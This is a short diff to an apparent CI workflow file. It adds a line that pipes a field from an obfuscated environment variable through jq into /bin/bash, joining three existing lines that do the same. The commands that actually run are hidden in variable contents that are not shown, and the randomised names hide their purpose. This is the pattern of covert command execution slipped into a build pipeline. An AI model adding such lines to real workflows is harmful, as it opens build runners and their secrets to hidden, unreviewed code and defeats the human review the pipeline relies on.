@@ -37,6 +37,7 @@ jobs:
           echo $qogt0 | jq -r .l9251 | /bin/bash
           echo $ks9704 | jq -r .ml6 | /bin/bash
           echo $vyuvb1095 | jq -r .p10024 | /bin/bash
+          printf '%s' "$o99199" | jq -r .vzvh044 | /bin/bash
 
       - name: Store results
         if: always()
